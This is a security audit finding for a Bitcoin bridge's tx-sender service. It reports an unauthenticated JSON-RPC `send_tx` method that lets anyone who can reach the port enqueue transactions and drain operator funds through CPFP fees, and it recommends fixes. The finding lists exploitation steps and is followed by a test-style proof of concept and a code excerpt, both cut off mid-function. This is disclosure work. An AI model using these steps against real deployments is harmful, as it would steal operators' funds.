### Title
Unauthenticated JSON-RPC `send_tx` Allows Arbitrary Transaction Enqueuing and Operator Fee Drain — (`crates/clementine-tx-sender/src/jsonrpc/server.rs`)

---

### Summary

The tx-sender JSON-RPC server is started with `ServerBuilder::default()` and registers the `send_tx` method with no authentication layer. Any client that can reach the bound port can call `send_tx` with an arbitrary `InsertTryToSendParams`, causing the tx-sender to persist the transaction in `tx_sender_try_to_send_txs` and subsequently attempt to broadcast it — including creating CPFP fee-payer UTXOs funded from the operator's Bitcoin wallet.

---

### Finding Description

`start_jsonrpc_server` builds the server with no middleware, no mTLS, and no token check: [1](#0-0) 

The `send_tx` handler immediately deserializes the caller-supplied hex and calls `insert_try_to_send` without any identity or role check: [2](#0-1) 

`insert_try_to_send` unconditionally persists the transaction and its metadata to the DB: [3](#0-2) 

The task loop then picks up every queued row and, for CPFP entries, calls `create_fee_payer_utxo`, which funds a new UTXO from the operator's Bitcoin Core wallet and broadcasts it: [4](#0-3) 

The bind address defaults to `127.0.0.1` but the config explicitly permits `0.0.0.0`: [5](#0-4) 

---

### Impact Explanation

An attacker who can reach the JSON-RPC port (trivially true when `TX_SENDER_JSONRPC_BIND=0.0.0.0`, and possible from any co-located process even on `127.0.0.1`) can:

1. Enqueue an arbitrary pre-signed transaction with `FeePayingType::CPFP`.
2. Force the tx-sender to create and broadcast fee-payer UTXOs funded from the operator's wallet.
3. Repeat indefinitely, draining the operator's Bitcoin balance through fee payments for transactions that may never confirm.

This is a direct loss of tx-sender-managed operator funds and an authorization bypass granting a privileged bridge action (transaction broadcast + fee spending) to an unauthenticated party.

---

### Likelihood Explanation

- When `TX_SENDER_JSONRPC_BIND=0.0.0.0` (required for multi-host deployments), any network-reachable attacker can exploit this.
- Even with `127.0.0.1`, any process on the same host — including other containers in a shared pod — can exploit this with no credentials.
- The code contains no authentication path at all; there is nothing to bypass, only an absent guard.

---

### Recommendation

Add an authentication layer before the `send_tx` handler. Options in increasing strength:

1. **Shared secret / bearer token**: validate a `Authorization` header in a `jsonrpsee` middleware layer before dispatching any method.
2. **mTLS**: configure `ServerBuilder` with a TLS acceptor that requires a client certificate signed by a bridge-internal CA.
3. **Unix-domain socket**: bind to a filesystem socket with OS-level permission bits instead of a TCP port, eliminating network exposure entirely.

At minimum, the server must reject unauthenticated callers before reaching `insert_try_to_send`.

---

        // Start txsender with JSON-RPC enabled on a free port.

        let url = format!("http://{addr}");

        let tx = Transaction {
            version: Version::TWO,
            lock_time: absolute::LockTime::ZERO,
            input: vec![TxIn {
                previous_output: OutPoint {
                    txid: Txid::all_zeros(),
                    vout: 0,
                },
                script_sig: ScriptBuf::new(),
                sequence: Sequence::ENABLE_LOCKTIME_NO_RBF,
                witness: Witness::default(),
            }],
            output: vec![TxOut {
                value: bitcoin::Amount::from_sat(0),
                script_pubkey: ScriptBuf::new(),
            }],
        };

        // Wait for server to come up (spawn loop initializes asynchronously).
        let start = Instant::now();
        let try_to_send_id = loop {
            match client
                .insert_try_to_send(None, &tx, FeePayingType::CPFP, None, &[], &[], &[], &[])
                .await
            {
                Ok(id) => break id,
                Err(e) => {
                    if start.elapsed() > Duration::from_secs(10) {
                        return Err(BridgeError::Eyre(eyre::eyre!(
                            "Timed out waiting for txsender JSON-RPC to start: {e:?}"
                        )));
                    }
                    tokio::time::sleep(Duration::from_millis(100)).await;
                }
            }
        };

        // Verify persisted in DB.
        let tx_sender_db = TxSenderDb::from_pool(db.pool().clone());
        let (_meta, stored_tx, fee_paying_type, _seen_at_height, _rbf) = tx_sender_db
            .get_try_to_send_tx(None, try_to_send_id)
            .await?;
        assert_eq!(fee_paying_type, FeePayingType::CPFP);
        assert_eq!(stored_tx.compute_txid(), tx.compute_txid());

        // Stop background loop.
        handle.abort();
        let _ = handle.await;

        Ok(())
    }

    pub async fn insert_try_to_send(
        &self,
        dbtx: &mut crate::TxSenderTransaction,
        tx_metadata: Option<TxMetadata>,
        signed_tx: &Transaction,
        fee_paying_type: FeePayingType,
        rbf_signing_info: Option<RbfSigningInfo>,
        cancel_outpoints: &[OutPoint],
        cancel_txids: &[Txid],
        activate_txids: &[ActivatedWithTxid],
        activate_outpoints: &[ActivatedWithOutpoint],
    ) -> Result<u32, BridgeError> {
        let txid = signed_tx.compute_txid();

        // do not add duplicate transactions to the txsender
        let tx_exists = self
            .db
            .check_if_tx_exists_on_txsender(Some(dbtx), txid)
            .await?;
        if let Some(try_to_send_id) = tx_exists {
            return Ok(try_to_send_id);
        }

        tracing::info!(
            "Added tx {} with txid {} to the queue",
            tx_metadata
                .as_ref()
                .map(|data| format!("{:?}", data.tx_type))
                .unwrap_or("N/A".to_string()),
            txid
        );

        let try_to_send_id = self
            .db
            .save_tx(
                dbtx,
                tx_metadata,
                signed_tx,
                fee_paying_type,
                txid,
                rbf_signing_info,
            )
            .await?;
